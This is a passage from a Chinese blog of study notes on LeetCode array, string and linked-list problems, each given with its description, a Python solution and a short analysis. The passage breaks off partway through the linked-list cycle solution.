<p>返回你可以从这笔交易中获取的最大利润。如果你不能获取任何利润，返回 <code>0</code> 。</p>
<p><strong>示例 1：</strong><br><code>输入：[7,1,5,3,6,4] 输出：5 解释：在第 2 天（股票价格 = 1）的时候买入，在第 5 天（股票价格 = 6）的时候卖出，最大利润 = 6-1 = 5 。      注意利润不能是 7-1 = 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。</code></p>
<p><strong>示例 2：</strong><br><code>输入：prices = [7,6,4,3,1] 输出：0 解释：在这种情况下, 没有交易完成, 所以最大利润为 0。</code></p>
<h4 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span>(<span class="params">self, prices</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type prices: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        base = prices[<span class="number">0</span>]</span><br><span class="line">        benefit = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(prices)):</span><br><span class="line">            <span class="keyword">if</span> base &gt; prices[i]:</span><br><span class="line">                base = prices[i]</span><br><span class="line">            <span class="keyword">if</span> base &lt; prices[i]:</span><br><span class="line">                benefit = <span class="built_in">max</span>(benefit,prices[i]-base)</span><br><span class="line">        <span class="keyword">return</span> benefit</span><br></pre></td></tr></table></figure>


<h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><p>和 第1天《53.最大子数组和》类似，采用一个变量来得到当前<strong>局部最优解</strong>，最后遍历完即可得到全局最优解。</p>
<p>注意需保证买的时候尽量低、卖的时候尽量高，且先买、后卖。</p>
<p>定义买价 base ，和利润 benefit 。</p>
<ul>
<li>每次遇到一个价格，先算出对应的利润（假设先买的是第一个），拿新价格卖出时的利润与旧价格卖出的利润（刚开始是0）相比较，取较大的值（如果新价格小于base，那么benefit就保持不变）。</li>
<li>然后就是看新价格与base，取较小者，如果小于就买入（期望后边能遇到价格高能卖出更高的利润），如果大于，就保持现在的买入价base不变。</li>
<li>然后到下一个价格，重复计算出利润，并取较大者，循环之前的步骤。</li>
</ul>
<p>这样的算法不会出现买入前卖出的情况，因为始终是当前价格与当前最低价差值与已有利润比较来得到最大利润，当前价格与当前最低价比较得到新的最低价，保证了总是拿后边的高价减去前面的低价，只要当前的价格高于后边的价格，就不会出现买入前卖出的情况。</p>
<h2 id="第4天-数组"><a href="#第4天-数组" class="headerlink" title="第4天 数组"></a>第4天 数组</h2><h3 id="566-重塑矩阵-【简单】"><a href="#566-重塑矩阵-【简单】" class="headerlink" title="566. 重塑矩阵 【简单】"></a>566. 重塑矩阵 【简单】</h3><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>在 <code>MATLAB</code> 中，有一个非常有用的函数 <code>reshape</code> ，它可以将一个 <code>m x n</code> 矩阵重塑为另一个大小不同（<code>r x c</code>）的新矩阵，但保留其原始数据。</p>
<p>给你一个由二维数组 <code>mat</code> 表示的 <code>m x n</code> 矩阵，以及两个正整数 <code>r</code> 和 <code>c</code> ，分别表示想要的重构的矩阵的行数和列数。</p>
<p>重构后的矩阵需要将原始矩阵的所有元素以相同的 <strong>行遍历顺序</strong> 填充。</p>
<p>如果具有给定参数的 <code>reshape</code> 操作是可行且合理的，则输出新的重塑矩阵；否则，输出原始矩阵。</p>
<p><strong>示例 1：</strong><br><code>输入：mat = [[1,2],[3,4]], r = 1, c = 4 输出：[[1,2,3,4]]</code></p>
<p><strong>示例 2</strong><br><code>输入：mat = [[1,2],[3,4]], r = 2, c = 4 输出：[[1,2],[3,4]]</code></p>
<h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">matrixReshape</span>(<span class="params">self, mat, r, c</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type mat: List[List[int]]</span></span><br><span class="line"><span class="string">        :type r: int</span></span><br><span class="line"><span class="string">        :type c: int</span></span><br><span class="line"><span class="string">        :rtype: List[List[int]]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> r*c != <span class="built_in">len</span>(mat[<span class="number">0</span>])*<span class="built_in">len</span>(mat):</span><br><span class="line">            <span class="keyword">return</span> mat</span><br><span class="line">        </span><br><span class="line">        mat = [j <span class="keyword">for</span> i <span class="keyword">in</span> mat <span class="keyword">for</span> j <span class="keyword">in</span> i]</span><br><span class="line">        res = [[<span class="number">0</span>]*c <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(r)]</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(c):</span><br><span class="line">                res[i][j] = mat[index]</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>


<h4 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h4><p>首先判断 r * c 是否与原矩阵大小 m * n 一致，不一致直接返回原矩阵 mat；</p>
<p>然后重塑 mat 矩阵，将其化为一维扁平数组，创建 r*c 的矩阵，然后按次序填充。</p>
<h3 id="118-杨辉三角-【简单】"><a href="#118-杨辉三角-【简单】" class="headerlink" title="118. 杨辉三角 【简单】"></a>118. 杨辉三角 【简单】</h3><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个非负整数 <code>numRows</code>，生成「杨辉三角」的前 <code>numRows</code> 行。</p>
<p>在「杨辉三角」中，每个数是它左上方和右上方的数的和。</p>
<img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/118.gif" class>

<p><strong>示例 1:</strong><br><code>输入: numRows = 5 输出: [[1],[1,1],[1,2,1],[1,3,3,1],[1,4,6,4,1]]</code></p>
<p><strong>示例 2:</strong><br><code>输入: numRows = 1 输出: [[1]]</code></p>
<h4 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numRows): <span class="comment">#循环i次，添加i个[]</span></span><br><span class="line">            res.append([])</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,i+<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> j == <span class="number">0</span> <span class="keyword">or</span> i==j:  <span class="comment">#杨辉三角的特点：j==0和i==j时都等于1 </span></span><br><span class="line">                    res[i].append(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">else</span>:<span class="comment">#例如2 ，2等于上一层的两个1之和</span></span><br><span class="line">                    res[i].append(res[i-<span class="number">1</span>][j-<span class="number">1</span>]+res[i-<span class="number">1</span>][j])</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h4 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h4><p>运用2个循环，首先添加i个[]（i行），根据杨辉三角的特点，列数为行数+1</p>
<ul>
<li>当j==0和i==j时都等于1，第i行数据列表添加1</li>
<li>否则 第i行第j个元素添加为上一层前一个和后一个的和</li>
</ul>
<h2 id="第5天-数组"><a href="#第5天-数组" class="headerlink" title="第5天 数组"></a>第5天 数组</h2><h3 id="36-有效的数独-【中等】"><a href="#36-有效的数独-【中等】" class="headerlink" title="36. 有效的数独 【中等】"></a>36. 有效的数独 【中等】</h3><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><p>请你判断一个 <code>9 x 9</code> 的数独是否有效。只需要 <strong>根据以下规则</strong> ，验证已经填入的数字是否有效即可。</p>
<ol>
<li>数字 <code>1-9</code> 在每一行只能出现一次。</li>
<li>数字 <code>1-9</code> 在每一列只能出现一次。</li>
<li>数字 <code>1-9</code> 在每一个以粗实线分隔的 <code>3x3</code> 宫内只能出现一次。（请参考示例图）</li>
</ol>
<p><strong>注意：</strong></p>
<ul>
<li>一个有效的数独（部分已被填充）不一定是可解的。</li>
<li>只需要根据以上规则，验证已经填入的数字是否有效即可。</li>
<li>空白格用 ‘.’ 表示。</li>
</ul>
<p><strong>示例 1：</strong></p>
<img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/36.png" class>
<p><code>输入：board =  [[&quot;5&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;] ,[&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;] ,[&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;] ,[&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;] ,[&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;] ,[&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;] ,[&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;] ,[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;] ,[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]] 输出：true</code></p>
<p><strong>示例 2：</strong><br><code>输入：board =  [[&quot;8&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;] ,[&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;,&quot;9&quot;,&quot;5&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;] ,[&quot;.&quot;,&quot;9&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;] ,[&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;3&quot;] ,[&quot;4&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;3&quot;,&quot;.&quot;,&quot;.&quot;,&quot;1&quot;] ,[&quot;7&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;6&quot;] ,[&quot;.&quot;,&quot;6&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;2&quot;,&quot;8&quot;,&quot;.&quot;] ,[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;4&quot;,&quot;1&quot;,&quot;9&quot;,&quot;.&quot;,&quot;.&quot;,&quot;5&quot;] ,[&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;.&quot;,&quot;8&quot;,&quot;.&quot;,&quot;.&quot;,&quot;7&quot;,&quot;9&quot;]] 输出：false 解释：除了第一行的第一个数字从 5 改为 8 以外，空格内其他数字均与 示例1 相同。 但由于位于左上角的 3x3 宫内有两个 8 存在, 因此这个数独是无效的。</code></p>
<h4 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isValidSudoku</span>(<span class="params">self, board</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type board: List[List[str]]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            srotage = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                <span class="keyword">if</span> board[i][j] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> board[i][j] <span class="keyword">in</span> srotage:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    srotage.append(board[i][j])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            srotage = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">                <span class="keyword">if</span> board[j][i] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> board[j][i] <span class="keyword">in</span> srotage:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    srotage.append(board[j][i])</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>):</span><br><span class="line">                srotage = []</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">                        <span class="keyword">if</span> board[i+x][j+y] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                            <span class="keyword">continue</span></span><br><span class="line">                        <span class="keyword">if</span> board[i+x][j+y] <span class="keyword">in</span> srotage:</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            srotage.append(board[i+x][j+y])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>


<h4 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h4><p>直接按条件做三次判断即可。</p>
<ul>
<li>第一个循环判断<strong>行</strong>是否有重复数字</li>
<li>第二个循环判断<strong>列</strong>是否有重复数字</li>
<li>第三个循环判断<strong>子9宫格</strong>内是否有重复数字</li>
</ul>
<h3 id="73-矩阵置零-【中等】"><a href="#73-矩阵置零-【中等】" class="headerlink" title="73. 矩阵置零 【中等】"></a>73. 矩阵置零 【中等】</h3><h4 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个 <code>m x n</code> 的矩阵，如果一个元素为 <code>0</code> ，则将其所在行和列的所有元素都设为 <code>0</code> 。请使用 <strong>原地</strong> 算法。</p>
<p><strong>示例 1：</strong></p>
<img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/73-1.jpeg" class>
<p><code>输入：matrix = [[1,1,1],[1,0,1],[1,1,1]] 输出：[[1,0,1],[0,0,0],[1,0,1]]</code></p>
<p><strong>示例 2：</strong></p>
<img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/73-2.jpeg" class>
<p><code>输入：matrix = [[0,1,2,0],[3,4,5,2],[1,3,1,5]] 输出：[[0,0,0,0],[0,4,5,0],[0,3,1,0]]</code></p>
<h4 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setZeroes</span>(<span class="params">self, matrix</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type matrix: List[List[int]]</span></span><br><span class="line"><span class="string">        :rtype: None Do not return anything, modify matrix in-place instead.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        m = <span class="built_in">len</span>(matrix)</span><br><span class="line">        n = <span class="built_in">len</span>(matrix[<span class="number">0</span>])</span><br><span class="line">        row = []</span><br><span class="line">        col = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">                <span class="keyword">if</span> matrix[i][j] == <span class="number">0</span>:</span><br><span class="line">                    row.append(i)</span><br><span class="line">                    col.append(j)</span><br><span class="line">                     </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n): </span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> row <span class="keyword">or</span> j <span class="keyword">in</span> col:</span><br><span class="line">                    matrix[i][j] = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> matrix</span><br></pre></td></tr></table></figure>


<h4 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h4><p>首先记录矩阵matrix的行列各为多少，方便后面遍历矩阵。<br>第一次循环找到matrix中值为0的元素，记录其行列加入列表中。<br>第二次循环找到对应行列表、列列表中的值，将与该行该列有关的值都置为0。</p>
<h2 id="第6天-字符串"><a href="#第6天-字符串" class="headerlink" title="第6天 字符串"></a>第6天 字符串</h2><h3 id="386-字符串中的第一个唯一字符-【简单】"><a href="#386-字符串中的第一个唯一字符-【简单】" class="headerlink" title="386. 字符串中的第一个唯一字符 【简单】"></a>386. 字符串中的第一个唯一字符 【简单】</h3><h4 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个字符串 <code>s</code> ，找到 它的第一个不重复的字符，并返回它的索引 。如果不存在，则返回 <code>-1</code> 。</p>
<p><strong>示例 1：</strong><br><code>输入: s = &quot;leetcode&quot; 输出: 0</code></p>
<p><strong>示例 2:</strong><br><code>输入: s = &quot;loveleetcode&quot; 输出: 2</code></p>
<p><strong>示例 3:</strong><br><code>输入: s = &quot;aabb&quot; 输出: -1</code></p>
<h4 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">firstUniqChar</span>(<span class="params">self, s</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        f = Counter(s)</span><br><span class="line">        <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">            <span class="keyword">if</span> f[ch] == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> i </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure>


<h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>思路很简单，可以直接采用python中Counter记下字符串中每个字符出现的次数，存到字典f中；<br>然后遍历判断对应字符出现次数为1的时候返回其索引。</p>
<h3 id="383-赎金信-【简单】"><a href="#383-赎金信-【简单】" class="headerlink" title="383. 赎金信 【简单】"></a>383. 赎金信 【简单】</h3><h4 id="题目描述-11"><a href="#题目描述-11" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你两个字符串：<code>ransomNote</code> 和 <code>magazine</code> ，判断 <code>ransomNote</code> 能不能由 <code>magazine</code> 里面的字符构成。</p>
<p>如果可以，返回 <code>true</code> ；否则返回 <code>false</code> 。</p>
<p><code>magazine</code> 中的每个字符只能在 <code>ransomNote</code> 中使用一次。</p>
<p><strong>示例 1：</strong><br><code>输入：ransomNote = &quot;a&quot;, magazine = &quot;b&quot; 输出：false</code></p>
<p><strong>示例 2：</strong><br><code>输入：ransomNote = &quot;aa&quot;, magazine = &quot;ab&quot; 输出：false</code></p>
<p><strong>示例 3：</strong><br><code>输入：ransomNote = &quot;aa&quot;, magazine = &quot;aab&quot; 输出：true</code></p>
<h4 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">canConstruct</span>(<span class="params">self, ransomNote, magazine</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type ransomNote: str</span></span><br><span class="line"><span class="string">        :type magazine: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        x = Counter(ransomNote)</span><br><span class="line">        y = Counter(magazine)</span><br><span class="line">        <span class="keyword">if</span> x - y:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>


<h4 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h4><p>统计两个字符串中每个字符的出现次数，如果发现 ransomNote 中存在某个英文字母的统计次数大于 magazine 中该字母统计次数(If条件为真，执行语句)，则返回 false。</p>
<h3 id="242-有效的字母异位词-【简单】"><a href="#242-有效的字母异位词-【简单】" class="headerlink" title="242. 有效的字母异位词 【简单】"></a>242. 有效的字母异位词 【简单】</h3><h4 id="题目描述-12"><a href="#题目描述-12" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定两个字符串 <code>s</code> 和 <code>t</code> ，编写一个函数来判断 <code>t</code> 是否是 <code>s</code> 的字母异位词。</p>
<p>注意：若 <code>s</code> 和 <code>t</code> 中每个字符出现的次数都相同，则称 <code>s</code> 和 <code>t</code> 互为字母异位词。</p>
<p><strong>示例 1:</strong><br><code>输入: s = &quot;anagram&quot;, t = &quot;nagaram&quot; 输出: true</code></p>
<p><strong>示例 2:</strong><br><code>输入: s = &quot;rat&quot;, t = &quot;car&quot; 输出: false</code></p>
<h4 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isAnagram</span>(<span class="params">self, s, t</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :type t: str</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> Counter(s) == Counter(t):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>


<h4 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h4><p>直接利用Counter计数器，判断两个字符串中字符出现次数是否一致</p>
<h2 id="第7天-链表"><a href="#第7天-链表" class="headerlink" title="第7天 链表"></a>第7天 链表</h2><h3 id="141-环形链表-【简单】"><a href="#141-环形链表-【简单】" class="headerlink" title="141. 环形链表 【简单】"></a>141. 环形链表 【简单】</h3><h4 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个链表的头节点 <code>head</code> ，判断链表中是否有环。</p>
<p>如果链表中有某个节点，可以通过连续跟踪 <code>next</code> 指针再次到达，则链表中存在环。 为了表示给定链表中的环，评测系统内部使用整数 <code>pos</code> 来表示链表尾连接到链表中的位置（索引从 0 开始）。<strong>注意：<code>pos</code> 不作为参数进行传递</strong> 。仅仅是为了标识链表的实际情况。</p>
<p>如果链表中存在环 ，则返回 <code>true</code> 。 否则，返回 <code>false</code> 。</p>
<p> <br>示例 1：</p>
<img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/141-1.png" class>
<p><code>输入：head = [3,2,0,-4], pos = 1 输出：true 解释：链表中有一个环，其尾部连接到第二个节点。</code></p>
<p><strong>示例 2：</strong></p>
<img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/141-2.png" class>
<p><code>输入：head = [1,2], pos = 0 输出：true 解释：链表中有一个环，其尾部连接到第一个节点。</code></p>
<p><strong>示例 3：</strong></p>
<img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/141-3.png" class>
<p><code>输入：head = [1], pos = -1 输出：false 解释：链表中没有环。</code></p>
<h4 id="代码-13"><a href="#代码-13" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hasCycle</span>(<span class="params">self, head</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type head: ListNode</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        seen = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">while</span> head:</span><br><span class="line">            <span class="keyword">if</span> head <span class="keyword">in</span> seen:</span><br><span class="line">                <span 